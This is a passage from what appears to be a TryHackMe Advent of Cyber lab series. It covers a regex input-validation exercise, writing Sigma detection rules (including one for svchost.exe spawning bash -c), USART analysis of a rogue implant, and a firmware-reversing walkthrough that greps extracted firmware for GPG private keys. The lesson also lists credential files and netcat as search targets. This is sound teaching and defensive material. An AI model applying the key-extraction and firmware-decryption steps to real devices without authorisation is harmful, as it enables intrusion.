On the other hand, the one below uses the HTMLPurifier library to help with some use cases, such as our `<textarea>` conundrum above. 

![Purifier Example](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/f66f8bfc285d5d43cfcaea4834ff6adb.png)

Both examples are done on the server-side to escape characters and purify content, respectively both effective ways to prevent user misuse and XSS attacks. Implementing both client and server-side validations ensure that no stones are left unturned.

This exact case highlights the importance of layering defenses and shows point-blank the limitation of client-side input validation. It also gives rise to the notion that input validation is not a one-stop shop for securing your application.

Specific cases warrant specific security requirements, and so on this factor alone, it’s already apparent that there exist multiple ways of attacking the challenge of securing user-provided input, and most of the time, they are implemented on top of each other.

Not All Solutions are Equal

Input validation is an important layer of security that all production-level applications should have. However, no matter how ‘perfect’ your input validation is for your specific use case, there simply are limitations to all kinds of security implementations - and input validation is not exempt from it.

You cannot make your application fully XSS-proof through input validation alone. Controls may be put in place at the input level that may lessen the attack surface of the application, but it doesn’t fully remediate it. Full remediation of an XSS vulnerability in your application requires additional layers of defenses, such as mitigation on the browser-level (via secure cookies, content-security-policy headers, etc.) and escaping and purifying user-provided input.

In light of these remediation techniques, it makes sense to tackle each challenge on its own - SQL and LDAP-related vulnerabilities are addressed differently from XSS, so why try to fit them all in the same formula?  

Summary

Despite being a very important security control, due diligence in securing applications involving user-provided input should not stop in validating the input per se. As seen in previous examples, user input may be valid, but it doesn’t necessarily mean that it’s harmless.

There are a lot of tools and frameworks out there that when used properly can help secure your application. For instance, HTML5's features can help in minimizing input form misuse, while the use of regular expressions can help filter out what we need from the user more granularly. We took a closer look at regex here especially because of its powerful capability to implement filters.

And while the above examples aren't directly concerned about application security, they help minimize the attack surface of the application, which is further tackled through server-side validation techniques such as output escaping and using parametrized queries.  

We should be realistic and not try to solve all security problems with input validation. There is not one control that could prevent persistent malicious actors and so layering these controls is the better way to move forward.

Exercise

We have prepared a regex exercise that you can access through the machine provided. First, let's start the Virtual Machine by pressing the Start Machine button at the top of this task. The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. 

To practice your regex, first, change your working directory to the RegExPractice folder using the command: `cd ~/Desktop/RegExPractice` then, you may either use _egrep_ via the following syntax: `egrep 'regex_pattern_here' strings`, or the _regex_checker.py_ script written for you via python: `python3 regex_checker.py`.

We are aware that some structured data are more complex than others, so we have set a specific syntax you may follow to make the exercise simpler. Have fun!

-   Filtering for Usernames: Alphanumeric, minimum of 6 characters, maximum of 12 characters, may consist of upper and lower case letters.


		 Filtering for Emails: Follows the form "local-part@domain" (without quotation marks); local-part is a random string, and the domain is in the form of "<domain name>.tld". All top-level domains (tld) are ".com"


-   Filtering for URLs: Starts with either http or https; some of the URLs have "www", and a TLD should exist.  
    

Answer the questions below

Filtering for Usernames: How many usernames fit the syntax above?

This regex can be seen in one of the examples in the task, marked as 'one of the most foundational regex patterns'. Minimum and maximum characters are done as "{min,max}"

### [Day 18] Sigma Lumberjack Lenny Learns New Rules

                  The Story

![Task banner for day 18](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/ad32970704bf0d7932de3b91a747afa6.png)

Check out Cybrites' video walkthrough for Day 18 [here](https://www.youtube.com/watch?v=4Zqd_FlkEu8)!

Compromise has been confirmed within the Best Festival Company Infrastructure, and tests have been conducted in the last couple of weeks. However, Santa’s SOC team wonders if there are methodologies that would help them perform threat detection faster by analysing the logs they collect. Elf McSkidy is aware of Sigma rules and has tasked you to learn more and experiment with threat detection rules.

## Threat Detection

Cyber threats and criminals have advanced tactics to ensure that they steal information and cause havoc. As you have already seen through the previous days, there are many ways in which this can be done. There are also ways for security teams to prepare their defences and identify these threats. What would be evident is that most of the blue-team activities will require proactive approaches to analysing different logs, malware and network traffic. This brings about the practice of threat detection.

Threat detection involves proactively pursuing and analysing abnormal activity within an ecosystem to identify malicious signs of compromise or intrusion within a network.

## Attack Scenario

Elf McBlue obtained logs and information concerning the attack on the Best Festival Company by the Bandit Yeti. Through the various analysis of the previous days, it was clear that the logs pointed to a likely attack chain that the adversary may have followed and can be mapped to the Unified Kill Chain. Among the known phases of the UKC that were observed include the following:

-   **Persistence**: The adversary established persistence by creating a local user account they could use during their attack.
-   **Discovery**: The adversary sought to gather information about their target by running commands to learn about the processes and software on Santa’s devices to search for potential vulnerabilities.
-   **Execution**: Scheduled jobs were created to provide an initial means of executing malicious code. This may also provide them with persistence or be part of elevating their privileges. 

The attack chain report included indicators of compromise (IOCs) and necessary detection parameters, as listed below. Additionally, the attack techniques have been linked to the MITRE ATT&CK framework for further reading.

Before we proceed to the next section, deploy the attached machine and give it up to 5 minutes to launch its services. Once launched, use the AttackBox or VPN to access the link [http://MACHINE_IP](http://machine_ip/) to our Sigma application, which constitutes the following features:

-   **Run** - Submit your Sigma rule and see if it detects the malicious IOC.
-   **Text Editor** - Write your Sigma rule in this section.
-   **Create Rule** - Create a Sigma rule for the malicious IOC.
-   **View Log** - View the log details associated with the malicious IOC.

## Chopping Logs with Sigma Rules

Sigma is an open-source generic signature language developed by Florian Roth & Thomas Patzke to describe log events in a structured format. The format involves using a markup language called [YAML](http://yaml.org/), a designed syntax that allows for quick sharing of detection methods by security analysts. The common factors to note about YAML files include the following:

-   YAML is case-sensitive.
-   Files should have the `.yml` extension.
-   Spaces are used for indentation and not tabs.
-   Comments are attributed using the `#` character.
-   Key-value pairs are denoted using the colon `:` character.
-   Array elements are denoted using the dash `-` character.

Sigma makes it easy to perform content matching based on collected logs to raise threat alerts for analysts to investigate. Log files are usually collected and stored in a database or a Security Information and Event Management (SIEM) solution for further analysis. Sigma is vendor-agnostic; therefore, the rules can be converted to a format that fits the target SIEM.

Sigma was developed to satisfy the following scenarios:

-   To make detection methods and signatures shareable alongside IOCs and Yara rules.
-   To write SIEM searches that avoid vendor lock-in.
-   To share signatures with threat intelligence communities.
-   To write custom detection rules for malicious behaviour based on specific conditions.

## Sigma Rule Syntax

![Sigma Rule Structure](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/ab03bb7d76129d0b7b20bd5b5120a553.png)Sigma rules are guided by a given order of required/optional fields and values that create the structure for mapping needed queries. The attached image provides a skeletal view of a Sigma rule.

Let’s use the first attack step challenge to define the syntax requirements, fill in the details into our skeletal rule, and detect the creation of local accounts. Use the text editor section of the SigHunt application to follow along.

-   **Title:** Names the rule based on what it is supposed to detect.
    
-   **ID:** A globally unique identifier that the developers of Sigma mainly use to maintain the order of identification for the rules submitted to the public repository, found in UUID format.
    
-   **Status:** Describes the stage in which the rule maturity is at while in use. There are five declared statuses that you can use:
    
    -   _Stable_: The rule may be used in production environments and dashboards.
    -   _Test_: Trials are being done to the rule and could require fine-tuning.
    -   _Experimental_: The rule is very generic and is being tested. It could lead to false results, be noisy, and identify exciting events.
    -   _Deprecated_: The rule has been replaced and would no longer yield accurate results. 
    -   _Unsupported_: The rule is not usable in its current state (unique correlation log, homemade fields).

-   **Description:** Provides more context about the rule and its intended purpose. Here, you can be as detailed as possible to provide information about the detected activity.
    

local_account_creation.yml

```shell-session
title: Suspicious Local Account Creation
id: 0f06a3a5-6a09-413f-8743-e6cf35561297 
status: experimental
description: Detects the creation of a local user account on a computer.
```

-   **Logsource:** Describes the log data to be used for the detection. It consists of other optional attributes:
    
    -   _Product_: Selects all log outputs of a certain product. Examples are Windows, Apache
    -   _Category_: Selects the log files written by the selected product. Examples are firewalls, web, and antivirus.
    -   _Service_: Selects only a subset of the logs. Examples are _sshd_ on Linux or _Security_ on Windows.
    -   _Definition_: Describes the log source and its applied configurations.

local_account_creation.yml

```shell-session
logsource:
  product: windows
  service: security
```

-   **Detection:**  A required field in the detection rule describes the parameters of the malicious activity we need an alert for. The parameters are divided into two main parts:
    
    -   _The search identifiers_ are the fields and values the detection should search for.
    -   _The condition expression_ - sets the action to be taken on the detection, such as selection or filtering. The critical thing to look out for account creation on Windows is the Event ID associated with user accounts. In this case, Event ID: 4720 was provided for us on the IOC list, which will be our search identifier.

local_account_creation.yml

```shell-session
detection:
  selection:
    EventID:  # This shows the search identifier value
      - 4720    # This shows the search's list value
  condition: selection
```

  
The search identifiers can be enhanced using different modifiers appended to the field name with the pipe character `|`. The main type of modifiers are known as **Transformation modifiers** and comprise the values: _contains_, _endswith_, _startswith_, and _all_. Some of these modifiers will be vital in writing rules against the other IOCs.

random_rule.yml

```shell-session
detection:
  selection:
    Image|endswith:
      - '\svchost.exe'
    CommandLine|contains|all: 
      - bash.exe
      - '-c '   
  condition: selection
```

-   **FalsePositives:** A list of known false positives that may occur based on log data.
    
-   **Level:** Describes the severity with which the security team should take the activity under the written rule. The attribute comprises five levels: Informational -> Low -> Medium -> High -> Critical
    
-   **Tags:** Adds information that can be used to categorise the rule. Common tags are associated with tactics and techniques from the MITRE ATT&CK framework. Sigma developers have defined a list of [predefined tags](https://github.com/SigmaHQ/sigma/wiki/Tags).
    

local_account_creation.yml

```shell-session
falsepositives: 
    - unknown
level: low
tags:
   - attack.persistence # Points to the MITRE Tactic
   - attack.T1136.001 # Points to the MITRE Technique
```

  

Voila!! We have written our first Sigma rule and can run it on the AoC Sigma Hunting application to see if we can get a match. As mentioned before, Sigma rules are converted to fit the desired SIEM query, and in our case, it should be known that they are being transformed into Elastic Queries on the backend. Various resources perform this task, with the native tool being [Sigmac](https://github.com/SigmaHQ/sigma/blob/master/tools/README.md), which is being deprecated and replaced with a more stable python library, [pySigma](https://github.com/SigmaHQ/pySigma). Another notable tool to check out is [Uncoder.io](https://uncoder.io/). Uncoder.IO is an open-source web Sigma converter for numerous SIEM and EDR platforms. It is easy to use as it allows you to copy your Sigma rule on the platform and select your preferred backend application for translation.

## Activity

Equipped with the knowledge about Sigma rules, your task is to complete the remaining two challenges by writing rules corresponding to the attack chain phases and IOCs. Santa is relying on you to beef up his security against adversaries attempting to stop Christmas this year. As a reminder, the required fields for the attacks are below:

-   **Software Discovery**: Category, EventID, Image, CommandLine.
-   **Scheduled Jobs**: Category, EventID, Image, CommandLine.

Check out John Hammond's video walkthrough for Day 19 [here](https://www.youtube.com/watch?v=HE12-x7E7lc)!

Spying on Santa

Elf McSkidy was doing a regular sweep of Santa's workshop when he discovered a hardware implant! The implant has a web camera attached to a microprocessor and another chip. It seems like someone was planning something malicious... We must try to understand what this implant was trying to do! We will deal with the microprocessor and the web camera in future tasks; for now, let's try to uncover what that other chip is being used for.

The VM that we will use in this task takes approximately 8 minutes to start. We suggest that you start the machine now to have it ready by the time you get to the practical element of the task!  

Learning Objectives

-   How data is sent via electrical wires in low-level hardware
-   Hardware communication protocols
-   How to analyse hardware communication protocols
-   Reading USART data from a logic capture

Welcome to the Matrix

Hardware hacking is often shrouded in mystery and seen as a super complex topic. While there are a lot of in-depth complex hardware hacking components, getting our feet wet is actually pretty simple. Computers today are incredibly powerful. This allows them to build additional features and safety measures into their communication protocols to ensure that messages are transmitted reliably. Think about the Transmission Control Protocol (TCP), which has multiple redundancies in place! It even sends three full packets just to start its communication!

In the world of microchips, we often don't have this luxury. To make sure our communication protocols are efficient as possible, we need to keep them as simple as possible. To do that, we need to enter the world of 0s and 1s. This then begs the question, how does hardware take electricity and generate signals? In this task, we will focus on digital communication. For hardware communication, we use a device called a Logic Analyser to analyse the signals. This device can be connected to the actual electrical wires that are used for communication between two devices that will capture and interpret the signals being sent. In this task, we will use a logic analyser to determine the communication between two devices in the rogue implant.  

The Electrical Heartbeat

Back to our question, if we have electricity, how can we generate a digital signal? The approach most hardware components take is to simply turn the power on and off. If the power is on, we are transmitting a digital 1. If the power is off, we are transmitting a digital 0. We call these 1s and 0s bits. To perform communication, we simply turn the power on and off in a specific sequence to transmit a bunch of 0s and 1s. If we send 8 bits, we are sending a single byte! Voila! We have just performed digital hardware communication! These are the wonderful squiggly lines you would see on a logic analyser:

![logicanalyser](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39e34851adce2e5394fcd45bf06eb40f.png)  

We can transmit text data by using the [ASCII table](https://www.asciitable.com/). Sending the binary representation of each character, we can transmit data! However, it isn't actually just that simple. If we wanted zero effort in our communication, we would need an electrical wire for each 0 or 1 that we wanted to transmit. Considering that a single character is one byte of data (thus 8 electrical wires), this can become a mess of wires really fast! To make this more efficient, we need to use fewer wires and then have both hardware chips agree to a specific digital protocol and configuration that will be used to transmit data. Let's look at some of the most common protocols and how they work to send data still while reducing the number of wires we need.

**USART**

Universal Synchronous/Asynchronous Receiver-Transmitter (USART) communication, or as it is better known, serial communication, is a protocol that uses two wires. One wire is used to transmit (TX) data from device A to device B, and the other wire is used to receive (RX) data on device A from device B. In essence, we connect the transmit port from one device to the receive port from the other device and vice versa.

What is interesting about this protocol is that there is no clock line that synchronises the communication of the devices. Without a clock, the devices have to agree to the configuration of communication, such as the following:

-   Communication speed - This is also called the baud rate or bit rate and dictates how fast bytes of data can be sent. Agreeing to a specific rate tells each device how fast it should sample the data to get accurate communication. While there are fixed standards for baud rates, devices can choose to use any other rate as long as both devices support it.  
    
-   Bits per transmission - This is normally set to 8 bits which makes a byte, but it can be configured to something else, such as 16 bits.
-   Stop and Start bits - Since there is no clock, one device has to send a signal to the other device before it can send or end a data transmission. The configuration of the start and stop bits dictate how this is done.
-   Parity bits - Since there can be errors in the communication, parity bits can be used to detect and correct such errors in the transmission.

Once the two devices agree on the configuration of the serial lines, they can now communicate with each other. A single transmission is shown in the diagram below on how the ASCII character of "S" would be transmitted:

![USART comms](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b1c981a472ba20b8cfa63b8b979ab156.png)  

There are a couple of caveats, however. The devices don't really have a way to determine if the other device is ready for communication. To solve this, some USART connections will use two additional lines called Clear To Send (CTS) and Request to Send (RTS) to communicate to the other device whether it is ready to receive or ready to transmit. Furthermore, to agree upon what voltage level is a binary 1 or 0, a third wire called the Ground (GND) wire is required to allow the devices to have the same voltage reference.  

However, despite all of this, USART is an incredibly popular protocol in microprocessors due to its simplicity.  

**SPI**

The Serial Peripheral Interface (SPI) communication protocol is mainly used for communication between microprocessors and small peripherals such as a sensor or an SD card. While USART communication has the clock built into the TX and RX lines, SPI uses a separate clock wire. Separating the clock (SCK) from the data (DATA) line allows for synchronous communication, which is faster and more reliable. So the trade-off is adding an additional wire, but we gain a speed and reliability boost. An example of the same "S" being transmitted using SPI is shown below:

![SPI comms](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2a62b649df7a735b95ba79e9c607983.png)  

The clock line tells the receiving device exactly when it needs to read the data line. Two-way communication is also possible, but quite a bit more complex than serial communication. Essentially, one of the devices is labelled the controller. This is the only device that is allowed to send clock signals. All other devices become secondary devices that must follow the controller's clock signal to transmit data back. If two-way communication is used, instead of having a single data line, two lines are used, namely Peripheral-In Controller-Out (PICO), which means communication is sent from the controller, and Peripheral-Out Controller-In (POCI), which means communication is sent from the secondary device back to the controller. Using this, the controller sends a clock signal and a command out to the device using the PICO line and then keeping the clock signal, the controller receives data back on the PICO line, as shown in the diagram below:

![SPI multiple comms](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/55b41ceb83ddf1ebe0fa6b89f93658f8.png)  

There is one additional change that can be made. While there can only be one controller, there can be multiple secondary devices. To save wires and ports, all devices can use the same SCK, PICO, and POCI lines. A fourth wire, called the Chip Select (CS) wire, is used to distinguish the device that the communication is meant for. The controller can use this line to indicate to the specific device that it wants to communicate to it, as shown in the diagram below:

![I2C comms](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/cd478aa5322feda6199648ee392f36fc.png)  

SPI communication is a fair bit more complex than USART, but having a dedicated clock line increases the speed at which we can communicate and improves reliability.  

**I2C**

The Inter-Integrated Circuit (I2C) communication protocol was created to deal with the drawbacks of both the USART and SPI communication protocols. Because USART is asynchronous and has the clock built into the transmit and receive lines, devices have to agree ahead of time on the configuration of communication. Furthermore, speeds are reduced to ensure communication remains reliable. On the other hand, while SPI is faster and more reliable, it requires many more wires for communication, and every single additional peripheral requires one more Chip Select wire.

I2C attempts to solve these problems. Similar to USART, I2C only makes use of two lines for communication. I2C uses a Serial Data (SDA) line and Serial Clock (SCL) line for communication. However, instead of using a Chip Select wire to determine which peripheral is being communicated to, I2C uses an Address signal that is sent on the SDA wire. This Address tells all controllers and peripherals which device is trying to communicate and to which device it is trying to communicate to. Once the signal is sent, a Data signal can be used to send the actual communication. To notify other controllers and peripherals that communication is taking place and prevent these devices from talking over each other, a Start and Stop signal is used. Each device can monitor these Start and Stop signals to determine if the lines are busy with communication. An example of such a data transmission is shown below:  

![I2C comms](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/ce2b96adbbde1dcbc69dbf29eb027733.png)  

Since an external clock line is used, communication is still faster and more reliable than USART, and while it is slightly slower than SPI, the use of the Address signal means up to 1008 devices can be connected to the same two lines and will be able to communicate. Now that we understand the basics of hardware communication protocols, we can look to analyse the logic of that rogue implant!  

Probing the Logic

After sending this rogue implant to the forensic lab for analysis, the following circuit diagram is uncovered:

![Circuit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/e44bd191ed7226c3108d13cd783e69fd.png)  

![Circuit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/27be15b945182af1b52c3ad032a07bb6.png)Based on the diagram, it seems like there is a microprocessor that is connected to an ESP32 chip. Doing some research, we can see that the ESP32 chips allow microprocessors to communicate over WiFi and Mobile networks. So whatever this implant was doing, it was definitely communicating with someone else. If we can intercept the communication between the microprocessor and the ESP32 chip, we would be able to see what commands and information are being sent. It seems like the perfect opportunity for our red and blue team to team up! Elf Forensic and Elf Recon are on the job!

![Circuit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4e0dd79d20706e8df0ab5af1f1ae2167.png)The elves realise that these chips probably use digital communication that can be intercepted with a Logic Analyser. Looking at the wires between the chips, we see a black wire connected to a pin called GND and a red wire connected to a pin called VIN. Elf Forensic knows from experience that this would be the Ground and Voltage IN wires, respectively, meaning these wires are used to provide power to the chip. That then leaves the green and purple wires that would be used for data transmission. Seeing that they are connected to the RX0 and TX0 pins, Elf Recon can deduce that this refers to the Transmit and Receive lines of USART communication. Hence we are pretty sure that the protocol used for communication is USART. Armed with this information, the elves connect the probes of the Logic Analyser to the green and purple wires before powering on the implant. Immediately, super-fast signals are seen on the analyser! The elves create a logic data dump from the signals, and McSkidy is asking you to investigate what is actually being transmitted!

Analysing the Logic

In order to analyse the logic data dump, we will need to use a logic analyser tool called [Saleae](https://www.saleae.com/). Start the machine attached to this task (if you have not already) which will open an in-browser Windows machine where all the required tools have already been installed for you. Once the machine is loaded on the Desktop, double-click the Logic 2 application. Once loaded, you should see this screen:

![Logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/0ed920bc192a7ba8edffaf823c94f3cd.png)  

Let's import the logic data dump to start our analyser. Select the Open a Capture option and select the `santa` file that is on the Desktop and click Open:

![Logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4e0c2eb28242876c7cafd2cd8c262e5d.png)  

You can ignore the calibration error popup. Once loaded, you should be able to see the captures. If you hold Left-Ctrl and use the mouse wheel to zoom out a bit (or you can click on View->X Zoom Out), you should be able to see the digital signals:

![Logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c325939f530996de4bc535e256599bfd.png)  

D0 and D1 refer to the digital channels of the two lines that were probed. A0 and A1 refer to the analogue data from the probers. Hover your mouse over the first thick line on D1 channel 1 and use Left-Ctrl and the mouse wheel to zoom in again; you should be able to see the entire signal transfer:

![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f7ad8d25ec5178c39457cc1d98f6aef6.png)  

What is very interesting from this screen is that you can see how the analogue voltage data corresponds to the digital signal that is seen. Looking at the A1 Channel 1 vs D1 Channel 1, you can see that there are slight breaks in the analogue data that have been corrected in the digital channel. Now that we can see the digital signal data, we can look to use a logic analyser to read the contents of the data. Click on the Analyzers tab to the right:  

![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39216ec75845438168a567b970d13ff0.png)  

Since we know the protocol is USART, let's look to configure an Async Serial analyser for both Channel 1 and 0. Let's configure Channel 1's analyser first. If we were true hardware reverse engineers, we would first have to figure out the rate at which data is being transmitted as well as the specific configuration such as parity bits and frames. However, to keep this simple Forensic Elf has already discovered this for you. Alter your configuration to match the following and click Save:

![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/f6b580f9bf181ce63a342558a7d4774c.png)  

Once saved, we can see that the data is being analysed. Click the little terminal Icon, and we can actually read the data being transmitted!

![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5d377564abf7d61b3ea9f502e3d65498.png)  

We see the initialisation sequence of the serial line and then three lines of data being sent:

-   ACK REBOOT
-   CMDX195837
-   9600

This doesn't yet mean anything since we are only seeing one side of the data. In order to see the other messages, we need to add another analyser to Channel 0. Click the plus icon next to Analysers and add another Async Serial analyser with the same configuration, except for Channel 0:

![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/456cc627b945f3b2c5ddaf47b8f23c50.png)  

Once added, click the Trash icon in the bottom right to remove all terminal data. Once done, click on the three dots next to each analyser and select Restart on both of them. Your terminal should now look something like this:

![logic data](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/21b5fc616ae245fb42dd7a7e0532bc0b.png)  

Now we are starting to piece together the information! It seems like the microprocessor is establishing a session with the ESP32 device to allow communication to the control server! We can now see the full discussion between the two devices. The processor asks the ESP32 to reboot its connection to the control server. The ESP32 is happy to oblige but requests a security code to be sent to allow connection to the control server. Once the security code has been transmitted, the ESP32 allows the microprocessor to negotiate a new baud rate to be used for communication. Interestingly, once this new baud rate is accepted, we cannot read the rest of the output! However, since we intercepted the baud rate, we can simply edit our Channel 0 analyser to a new baud rate to read the rest of the communication that was sent. Go make this change to get your flag!

This is excellent progress! We were able to read the initial communication between these two devices that were used to establish a connection to the control server. Now that we have this information, we can keep monitoring the lines and analysing the logic to see any messages that are sent. We are one step closer to knowing who is responsible for this rogue implant!

Check out Saqib's video walkthrough for Day 20 [here](https://www.youtube.com/watch?v=1qc7C4h36ZQ)!  

  

We can now learn more about the mysterious device found in Santa's workshop. Elf Forensic McBlue has successfully been able to find the `device ID`. Now that we have the hardware `device ID`, help Elf McSkidy reverse the encrypted firmware and find interesting endpoints for IoT exploitation.  

  

**Learning Objectives**

-   What is firmware reverse engineering
-   Techniques for extracting code from the firmware
-   Extracting hidden keys from an encrypted firmware
-   Modifying and rebuilding a firmware

**What is Firmware Reverse Engineering**

Every embedded system, such as cameras, routers, smart watches etc., has pre-installed firmware, which has its own set of instructions running on the hardware's processor. It enables the **hardware to communicate with other software running on the device**. The firmware provides low-level control for the designer/developer to make changes at the root level. 

Reverse engineering is working your way back through the code to figure out how it was built and what it does. Firmware reverse engineering is extracting the original code from the firmware binary file and verifying that the code does not carry out any malicious or unintended functionality like undesired network communication calls. **Firmware reversing is usually done for security reasons** to ensure the safe usage of devices that may have critical vulnerabilities leading to possible exploitation or data leakage. Consider a smart watch whose firmware is programmed to send all incoming messages, emails etc., to a specific IP address without any indication to the user.

  

**Firmware Reversing Steps**

-   The firmware is first obtained from the vendor's website or extracted from the device to perform the analysis.
-   The obtained/extracted firmware, usually a binary file, is first analysed to figure out its type (bare metal or OS based). 
-   It is verified that the firmware is either encrypted or packed. The encrypted firmware is more challenging to analyse as it usually needs a tricky workaround, such as reversing the previous non-encrypted releases of the firmware or performing hardware attacks like [Side Channel Attacks (SCA)](https://en.wikipedia.org/wiki/Side-channel_attack) to fetch the encryption keys. 
-   Once the encrypted firmware is decrypted, different techniques and tools are used to perform reverse engineering based on type.

**Types of Firmware Analysis**  

Firmware analysis is carried out through two techniques, Static & Dynamic.

**Static Analysis**

Static analysis involves an essential examination of the binary file contents, performing its reverse engineering, and reading the assembly instructions to understand the functionality. This is done through multiple commonly used command line utilities and binary analysis tools such as:

-   **[BinWalk](https://github.com/ReFirmLabs/binwalk):** A firmware extraction tool that extracts code snippets inside any binary by searching for signatures against many standard binary file formats like `zip, tar, exe, ELF,` etc. Binwalk has a database of binary header signatures against which the signature match is performed. The common objective of using this tool is to extract a file system like `Squashfs, yaffs2, Cramfs, ext*fs, jffs2,` etc., which is embedded in the firmware binary. The file system has all the application code that will be running on the device.
-   **[Firmware ModKit (FMK)](https://www.kali.org/tools/firmware-mod-kit/)**: FMK is widely used for firmware reverse engineering. It extracts the firmware using `binwalk` and outputs a directory with the firmware file system. Once the code is extracted, a developer can modify desired files and repack the binary file with a single command.   
    
-   **[FirmWalker](https://github.com/craigz28/firmwalker)**: Searches through the extracted firmware file system for unique strings and directories like `etc/shadow`, `etc/passwd`, `etc/ssl`, special keywords like `admin, root, password`, etc., vulnerable binaries like `ssh, telnet, netcat` etc.

**Dynamic Analysis**

Firmware dynamic analysis involves running the firmware code on actual hardware and observing its behaviour through emulation and hardware/ software based debugging. One of the significant advantages of dynamic analysis is to analyse unintended network communication for identifying data pilferage. The following tools are also commonly used for dynamic analysis:

-   **[Qemu](https://www.qemu.org/)**: Qemu is a free and open-source emulator and enables working on cross-platform environments. The tool provides various ways to emulate binary firmware for different architectures like Advanced RISC Machines (ARM), Microprocessors without Interlocked Pipelined Stages (MIPS), etc., on the host system. Qemu can help in full-system emulation or a single binary emulation of ELF (Executable and Linkable Format) files for the Linux system and many different platforms.
-   **[Gnu DeBugger (GDB)](https://www.sourceware.org/gdb/)**[:](https://www.sourceware.org/gdb/) GDB is a dynamic debugging tool for emulating a binary and inspecting its memory and registers. GDB also supports remote debugging, commonly used during firmware reversing when the target binary runs on a separate host and reversing is carried out from a different host.

**Shall We Reverse the Firmware? Let's Do It!**  

Launch the virtual machine by clicking `Start Machine` at the top right of this task. The machine will load in a split-screen view. If it does not, click the `Show Split View` button to view the machine. Wait for 1-2 minutes for the machine to load completely. In case you refresh your web browser page, it will appear as if the target machine has restarted/rebooted (as it shows the default terminal output that is shown after booting up). In reality, the machine state remains the same, and your progress is not lost. When reversing the firmware, use the password `Santa1010` if prompted for a **sudo** password. 

  

After identifying the device id, McSkidy extracted the encrypted firmware from the device. To reverse engineer it, she needs an unencrypted version of the firmware first - luckily, she found it online. Open the terminal and run the `dir` command. You will see the following directories:

Terminal

```shell-session
ubuntu@machine$ dir
bin  firmware-mod-kit  bin-unsigned
```

The `bin` folder contains the firmware binary, while the `firmware-mod-kit` folder contains the script for extracting and modifying the firmware.

In this exercise, we will primarily be using two tools:

-   **Binwalk**: For verifying encryption and can also be used to decrypt the firmware (Usage: `binwalk -E -N`)
-   **Firmware Mod Kit (FMK)**: Library for firmware extraction and modification (Usage: `extract-firmware.sh`)

Now coming over to the task, we will perform reversing step by step.

**Step 1: Verifying Encryption**  
In this step, McSkidy will verify whether the binary `firmwarev2.2-encrypted.gpg` is encrypted through [file entropy analysis](https://en.kali.tools/?p=1634). First, change the directory to the `bin` folder by entering the command `cd bin`. She will then use the `binwalk` tool to verify the encryption using the command `binwalk -E -N firmwarev2.2-encrypted.gpg.`

Terminal

```shell-session
ubuntu@machine:-/bin$ binwalk -E -N firmwarev2.2-encrypted.gpg 

DECIMAL       HEXADECIMAL     ENTROPY
--------------------------------------------------------------------------------
0             0x0             Rising entropy edge (0.988935)

```

In the above output, the **rising entropy edge** means that the file is probably encrypted and has increased randomness.   

**Step 2: Finding Unencrypted Older Version**  
Since the latest version is encrypted, McSkidy found an older version of the same firmware. The version is located in the `bin-unsigned` folder. _Why was she looking for an older version?_ Because she wants to find encryption keys that she may use to decrypt the original firmware and reverse engineer it. McSkidy has decided to use the famous `FMK` tool for this purpose. To extract the firmware, change the directory by entering the command `cd ..` and then `cd bin-unsigned`. She extracted the firmware by issuing the following command.

Terminal

```shell-session
ubuntu@machine:-/bin-unsigned$ extract-firmware.sh firmwarev1.0-unsigned

```

  
Step 3: Finding Encryption Keys  
The original firmware is [gpg](https://en.wikipedia.org/wiki/GNU_Privacy_Guard) protected, which means that we need to find a public, and private key and a paraphrase to decrypt the originally signed firmware. We know that the unencrypted firmware is extracted successfully and stored in the `fmk` folder. The easiest way to find keys is by using the `grep` command. The `-i` flag in the grep command ignores case sensitivity while the `-r` operator recursively searches in the current directory and subdirectories.  

Terminal

```shell-session
ubuntu@machine:~bin-unsigned$ grep -ir key
Binary file firmwarev2.2-encrypted.gpg matches
Binary file firmwarev1.0-unsigned matches
Binary file fmk/image_parts/rootfs.img matches
Binary file fmk/rootfs/usr/sbin/dropbearmulti matches
Binary file fmk/rootfs/usr/sbin/dhcp6ctl matches
Binary file fmk/rootfs/usr/sbin/dhcp6c matches
Binary file fmk/rootfs/usr/sbin/xl2tpd matches
Binary file fmk/rootfs/usr/sbin/pppd matches
Binary file fmk/rootfs/usr/sbin/dhcp6s matches
Binary file fmk/rootfs/usr/bin/httpd matches
fmk/rootfs/gpg/public.key:-----BEGIN PGP PUBLIC KEY BLOCK-----
fmk/rootfs/gpg/public.key:-----END PGP PUBLIC KEY BLOCK-----
fmk/rootfs/gpg/private.key:-----BEGIN PGP PRIVATE KEY BLOCK-----
fmk/rootfs/gpg/private.key:-----END PGP PRIVATE KEY BLOCK-----


```

